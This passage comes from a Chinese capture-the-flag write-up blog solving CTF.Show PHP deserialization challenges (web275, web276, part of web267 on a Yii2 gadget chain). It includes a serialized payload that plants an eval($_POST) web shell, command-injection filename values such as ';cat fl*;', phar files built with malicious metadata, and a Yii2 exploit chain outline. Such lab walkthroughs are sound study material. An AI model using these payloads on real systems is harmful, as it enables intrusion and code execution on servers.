+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctfshowvip();</span><br><span class="line">    <span class="variable">$a</span>-&gt;username = <span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span>-&gt;password = <span class="string">&quot;&lt;?php&quot;</span> . <span class="string">&#x27; eval($_POST[0]); ?&gt;&#x27;</span>;;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>然后在 AntSword 中进入 /flag_is_here 获取 flag。</p>
+<h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><p><code>本题目基于 PHP7.3.11</code></p>
+<p>俗话说得好，最evil的才是最骚的（不是</p>
+<p>留意下列条件，卧槽evil反而能利用system？我还以为是利用file_put_contents来做，但很明显这里有更方便的方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造fn参数为 <code>php;ls</code> 可以看到当前目录下有两个文件<code>flag.php index.php</code></p>
+<p>构造fn参数为 <code>php;cat flag.php</code> 获取flag</p>
+<h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1><p><code>本题目基于 PHP7.3.11</code></p>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45882317/article/details/116225803">https://blog.csdn.net/weixin_45882317/article/details/116225803</a></p>
+<p>这里判断条件被<code>$this→admin</code>堵死了，看起来并没有其他途径来修改admin的值。</p>
+<h2 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>phar 的打包和使用<ul>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1555484">https://cloud.tencent.com/developer/article/1555484</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.iloveflag.com/2020/07/09/%E6%B5%85%E8%B0%88phar%E6%96%87%E4%BB%B6%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">https://www.iloveflag.com/2020/07/09/浅谈phar文件在ctf中的应用/</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/385362368">https://zhuanlan.zhihu.com/p/385362368</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h2><ul>
+<li>file_put_contents 中可以输入绝对路径，unlink 中也会丢出一个绝对路径，绝对路径和绝对路径拼接会导致unlink失败。</li>
+</ul>
+<h2 id="做法-11"><a href="#做法-11" class="headerlink" title="做法"></a>做法</h2><p>phar其实类似于jar一样，将一大堆的php代码打包封装好直接调用。</p>
+<p>首先，打包要将 phar.readonly 设置为 Off，否则会出现如下报错</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%208.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%208.png"></p>
+<p>将fn设成 <code>/var/www/html/233.txt</code> ，底下报出 <code>Warning: unlink(/var/www/html//var/www/html/233.txt): No such file or directory in /var/www/html/index.php on line 49</code> ，再访问233.txt，返回200，手术很成功.jpg</p>
+<p>首先尝试一下列出目录，payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;;ls;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;Powered By Genshin Impact&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br></pre></td></tr></table></figure>
+
+<p>在自己电脑上运行一下，会生成一个 phar.phar，然后丢到postman，设置post，内容为binary，参数fn为/var/www/html/phar.phar，发送</p>
+<p>然后在浏览器请求参数fn为 phar://phar.phar</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%209.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%209.png"></p>
+<p>wow，成功，注意这里不能将ls改成flag.php，否则会被第二个正则规则过滤，你可以改成cat fl*，或者你直接插个一句话木马也是没什么所谓的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二次拿flag的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;;cat fl*;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;Powered By Genshin Impact&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br></pre></td></tr></table></figure>
+
+<p>postman 设置</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2010.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2010.png"></p>
+<p>第二次请求 /?fn=phar://phar2.phar 右键查看源代码获取 flag</p>
+<h2 id="其他问题-1"><a href="#其他问题-1" class="headerlink" title="其他问题"></a>其他问题</h2><blockquote>
+<p>「你们难道就一点问题都没有的吗？」       —— TARI TARI</p>
+</blockquote>
+<ul>
+<li><p>怎么打包 phar</p>
+<p>  答：根据 <a target="_blank" rel="noopener" href="https://www.iloveflag.com/2020/07/09/%E6%B5%85%E8%B0%88phar%E6%96%87%E4%BB%B6%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">https://www.iloveflag.com/2020/07/09/浅谈phar文件在ctf中的应用/</a> ，打包 phar需要经过下列代码</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;&lt;?php phpinfo();&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>  由此又衍生处几个问题，包括但不限于</p>
+<ul>
+<li><p>为什么要设置 stub，他有什么作用吗？为什么要写 __HALT_COMPILER();？</p>
+<p>  参考资料：<a target="_blank" rel="noopener" href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">https://www.webhek.com/post/packaging-your-php-apps-with-phar.html</a></p>
+<blockquote>
+<p>运行Phar文件时，stub文件被当做一个meta文件来初始化Phar， 并告诉Phar文件在被调用时该做什么。</p>
+</blockquote>
+<p>  打个不太恰当的比喻，可能类似于phar的入口文件吧，或者像是模板的header.php，在调用内容前可以用来执行一下前面的函数。</p>
+<p>  同时，phar也必须加入__HALT_COMPILER();</p>
+<blockquote>
+<p>stub文件的结尾处需要调用 __HALT_COMPILER() 方法，这个方法后不能留空格。__HALT_COMPILER() 会立即终止PHP的运行，防止include的文件在此方法后仍然执行。这是Phar必须的，没有它Phar将不能正常运行</p>
+</blockquote>
+<p>  由此又衍生出一个问题</p>
+<ul>
+<li><p>可以在setStub时就插入file_put_contents插入一句话木马吗？</p>
+<p>  试了一下，无论是echo “test”;还是放置1.txt，还是修改为绝对路径 /var/www/html/1.txt ，好像都不能正常插入，可能不行？</p>
+<p>  &lt;待尝试&gt;</p>
+</li>
+</ul>
+</li>
+<li><p>为什么要设置添加其他压缩文件，它有什么用？不加可以吗</p>
+<p>  phar本质是一个压缩文件，需要其他文件来填充。实测如果不加其他文件来压缩的话，phar文件不能被产生。</p>
+</li>
+<li><p>为什么要设置Metadata，为什么它能够自动反序列化</p>
+<p>  参考资料：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/385362368">https://zhuanlan.zhihu.com/p/385362368</a></p>
+<blockquote>
+<p>manifest：压缩文件的属性等信息，其中的Meta-data会以序列化的形式存储。</p>
+</blockquote>
+<p>  也就是说，这个menifest存储的是压缩文件的属性信息，而又恰好这个metadata是以序列化的形式存储的，当对phar进行读取等操作的时候，就会将这个metadata给反序列化，自然可以调用到上文中的destruct。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><p><code>本题目基于 PHP7.3.11, Yii</code> 未完成</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113824239">https://blog.csdn.net/rfrder/article/details/113824239</a>（yii2框架 反序列化漏洞复现）</p>
+<h2 id="本地环境搭建"><a href="#本地环境搭建" class="headerlink" title="本地环境搭建"></a>本地环境搭建</h2><p>在 Github <a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a> 上下载 2.0.37 版本，解压到网站目录，并将 webroot 指向 /web ，安装 composer，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sS https:<span class="comment">//getcomposer.org/installer | php</span></span><br><span class="line">mv composer.phar /usr/local/bin/composer</span><br></pre></td></tr></table></figure>
+
+<p>完成后运行 <code>composer run-script post-create-project-cmd</code></p>
+<p>打开 yii2.local，查看是否安装成功</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2011.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2011.png"></p>
+<h2 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h2><p>参考资料：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113824239">https://blog.csdn.net/rfrder/article/details/113824239</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/potatsoSec/p/13693969.html">https://www.cnblogs.com/potatsoSec/p/13693969.html</a></li>
+</ul>
+<p>对于反序列链利用我还不是很懂，所以大部分都是跟着大佬和别人的wp依葫芦画瓢，此文章仅仅是为了记录我的一次实践过程，十分感谢上述这些资料的帮助。</p>
+<p>根据文章，反序列化反序列化，就是要用到unserialize的。不过不用急，我们先看一下 CVE-2020-15148 修复了什么。</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2012.png" alt="Untitled"></p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2013.png" alt="Untitled"></p>
+<p>从 <a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a> 可以看出，对 framework/db/BatchQueryResult.php 增添了 __wakeup 用于禁止 BatchQueryResult 被反序列化，言外之意就是我们要利用这个来进行反序列化漏洞。</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2014.png" alt="Untitled"></p>
+<p>这个漏洞的切入点为 __destruct()（到底是怎么找到的，我也不清楚，网上也没说清楚，可能是因为在这个类没有 __call 等其他 __ 开头的方法的时候，这个是最直接有效的可使用的？）</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2015.png" alt="Untitled"></p>
+<p>它调用了reset()，而 reset() 又调用了 close(); ，其中此处的判断条件又仅仅是判断是否为 null。</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2016.png" alt="Untitled"></p>
+<p>又因为反序列化中，其变量其实都是可控的，也就是说我们可以继续在此处放入一个任意的对象调用close()，只要它有 __call 就可以调用它了。</p>
+<p>全文搜索 <em>call ，发现一个较为合适的注入点 /verdor/fzaninotto/faker/src/Faker/Generator.php（为什么这里较为合适，是因为后面 format 还调用了 call_user_func_array吗？</em>）</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2017.png" alt="Untitled"></p>
+<p>为了了解到直接调用 →close(); 会发生什么，这里写一个简单的程序来展示一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">            print_r(<span class="variable">$method</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> A();</span><br><span class="line">    <span class="variable">$b</span>-&gt;close(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最终输出结果为 close Array ( [0] =&gt; 1 [1] =&gt; 2 )，也就是说close被当成第一个参数 method 被传进去了，而 close 中的参数被传入 param 中，为一个数组。</p>
+<p>我们再回来看这里的 __call ，调用了一个 format，巧了吗不是，format中call_user_func_array能被利用，我们再看这个 getFormatter 到底执行了什么</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2018.png" alt="Untitled"></p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2019.png" alt="Untitled"></p>
+<p>反序列化嘛，这么个变量我还治不了你？也就是说， call_user_func_array 的第一个参数我们是可以自行控制的。但不行啊，arguments我们控制不了啊，怎么办呢，那我们调用另一个对象的方法呗，反正$this→getFormatter($formatter)是可控的，没说这里必须要填个string吧？</p>
+<p>使用正则表达式 <code>function .*\(\)\n?\ \&#123;(.\n.*)+call_user_func\(\$this</code> （这里最后的$this存粹就是为了图方便，毕竟可以直接构造对象）在PHPStorm中查找，我们可以发现有一个符合条件的。</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2020.png" alt="Untitled"></p>
+<p>两个可控，香饽饽，文件在 <code>/rest/CreateAction.php</code> 下</p>
+<p>到这里，反序列化链就已经结束了。流程即为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/db/BatchQueryResult.php:<span class="number">79</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>;</span><br><span class="line"><span class="number">1</span>. BatchQueryResult() -&gt; __destruct()</span><br><span class="line">											-&gt; reset()</span><br><span class="line">											-&gt; <span class="keyword">$this</span>-&gt;_dataReader-&gt;close()</span><br><span class="line"><span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> Faker();</span><br><span class="line"></span><br><span class="line">*/verdor/fzaninotto/faker/src/Faker/<span class="built_in">Generator</span>.php:<span class="number">283</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;*</span><br><span class="line"><span class="number">2</span>. Faker() -&gt; __call() <span class="comment">// 通过 $this-&gt;_dataReader-&gt;close() 调用</span></span><br><span class="line">					 -&gt; <span class="keyword">$this</span>-&gt;format()</span><br><span class="line">					 -&gt; call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$formatter</span>))</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>(close)] = <span class="keyword">new</span> CreateAction();</span><br><span class="line"></span><br><span class="line">/vendor/yiisoft/yii2/rest/CreateAction:<span class="number">40</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>;</span><br><span class="line"><span class="number">3</span>. CreateAction() -&gt; run()</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess</span><br><span class="line"><span class="keyword">$this</span>-&gt;id</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/archives/CTF-Show-Get-Started-with-the-web-blasting.html" rel="prev" title="【Klee-CTF】CTF.Show Web入门 爆破 web21~web28">
+      <i class="fa fa-chevron-left"></i> 【Klee-CTF】CTF.Show Web入门 爆破 web21~web28
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html" rel="next" title="【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128">
+      【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web254"><span class="nav-number">1.</span> <span class="nav-text">web254</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web255"><span class="nav-number">2.</span> <span class="nav-text">web255</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-1"><span class="nav-number">2.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web256"><span class="nav-number">3.</span> <span class="nav-text">web256</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="nav-number">3.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-2"><span class="nav-number">3.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web257"><span class="nav-number">4.</span> <span class="nav-text">web257</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="nav-number">4.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-3"><span class="nav-number">4.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web260"><span class="nav-number">5.</span> <span class="nav-text">web260</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="nav-number">5.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-4"><span class="nav-number">5.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web262"><span class="nav-number">6.</span> <span class="nav-text">web262</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="nav-number">6.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-5"><span class="nav-number">6.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web263"><span class="nav-number">7.</span> <span class="nav-text">web263</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-5"><span class="nav-number">7.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-6"><span class="nav-number">7.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web264"><span class="nav-number">8.</span> <span class="nav-text">web264</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-6"><span class="nav-number">8.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-7"><span class="nav-number">8.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web265"><span class="nav-number">9.</span> <span class="nav-text">web265</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-7"><span class="nav-number">9.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-8"><span class="nav-number">9.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web266"><span class="nav-number">10.</span> <span class="nav-text">web266</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-8"><span class="nav-number">10.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E6%B3%95-9"><span class="nav-number">10.2.</span> <span class="nav-text">做法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web259"><span class="nav-number">11.</span> <span class="nav-text">web259</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-9"><span 